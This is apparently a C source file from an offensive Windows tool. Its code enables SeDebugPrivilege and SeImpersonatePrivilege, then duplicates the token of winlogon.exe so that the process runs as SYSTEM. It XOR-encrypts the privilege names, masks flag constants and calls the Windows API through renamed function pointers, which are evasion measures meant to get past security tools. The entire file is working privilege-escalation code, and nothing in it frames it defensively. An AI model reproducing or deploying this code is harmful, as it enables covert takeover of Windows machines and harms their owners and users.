#include "token.h"
#include "api.h"
#include "logger.h"
#include "utils.h"

// ========================================
// Functions to get needed privileges
// ========================================

// SeDebugPrivilege
static const unsigned char SE_DEBUG_ENC[] = { 0x63, 0x54, 0x76, 0x56, 0x56, 0x40, 0x51, 0x67, 0x4A, 0x50, 0x17, 0x0B, 0x0F, 0x01, 0x02, 0x03 };
// SeImpersonatePrivilege
static const unsigned char SE_IMP_ENC[] = { 0x63, 0x54, 0x7B, 0x5E, 0x44, 0x50, 0x44, 0x44, 0x57, 0x57, 0x00, 0x16, 0x06, 0x34, 0x17, 0x0F, 0x11, 0x01, 0x05, 0x0F, 0x57, 0x54 };

static const unsigned char* privs[] = {
    SE_DEBUG_ENC,
    SE_IMP_ENC
};
static const size_t priv_lens[] = {
    sizeof(SE_DEBUG_ENC),
    sizeof(SE_IMP_ENC)
};

BOOL EnablePrivilege(HANDLE hToken, const unsigned char* encryptedPriv, size_t encLen) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Decrypt string
    char* decA = xor_decrypt_string(encryptedPriv, encLen, XOR_KEY, key_len);
    if (!decA) return FALSE;

    // Convert to wide string
    wchar_t* decW = to_wide(decA);
    free(decA);
    if (!decW) return FALSE;

    if (!pLPVA(NULL, decW, &luid)) {
        log_error("LookupPrivilegeValue failed for %s. Error: %lu", decW, GetLastError());
        free(decW);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    DWORD attr = 0xA5 ^ 0xA7; // SE_PRIVILEGE_ENABLED (0x02) obfuscated
    tp.Privileges[0].Attributes = attr;

    BOOL result = pATP(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    free(decW);

    if (!result || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        return FALSE;

    log_success("Requested privilege enabled");
    return TRUE;
}

void EnableAllPrivileges(HANDLE hToken) {
    int n = sizeof(privs) / sizeof(privs[0]);
    for (int i = 0; i < n; i++) {
        if (!EnablePrivilege(hToken, privs[i], priv_lens[i])) {
            log_error("Failed to enable priv #%d", i);
        }
        else {
            // log_success("Privilege #%d enabled", i);
        }
    }
}

// Enable only SeDebugPrivilege
BOOL EnableSEDBGPRV() {
    // XOR decryption key is already defined globally as XOR_KEY, key_len
    HANDLE hProc = pGCP();  // GetCurrentProcess
    if (!hProc) {
        log_error("Error getting current process handle");
        return FALSE;
    }

    HANDLE hToken = NULL;

    // Obfuscated flags: TOKEN_ADJUST_PRIVILEGES (0x20) ^ 0x55 = 0x75
    //                   TOKEN_QUERY (0x08) ^ 0x55 = 0x5D
    // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    DWORD flags = (0x75 ^ 0x55) | (0x5D ^ 0x55);  // = 0x28

    if (!pOPTK(hProc, flags, &hToken)) {
        log_error("Error opening current token");
        return FALSE;
    }

    // Use existing logic to enable SeDebugPrivilege
    BOOL result = EnablePrivilege(hToken, SE_DEBUG_ENC, sizeof(SE_DEBUG_ENC));

    CloseHandle(hToken);
    return result;
}

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    log_info("Snapshot handle: %p", hSnapshot);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "pCTH  error: %u", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (pP32F(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = pOP(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (pOPTK(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (pDUPTOK(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            log_info("Requesting permissions for new duplicated token...");
                            EnableAllPrivileges(hDupToken);
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            log_success("Successfully duplicated token. Process can now run as SYSTEM.");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logfile, "Failed to obtain system token");
        return FALSE;
    }
    return TRUE;
}




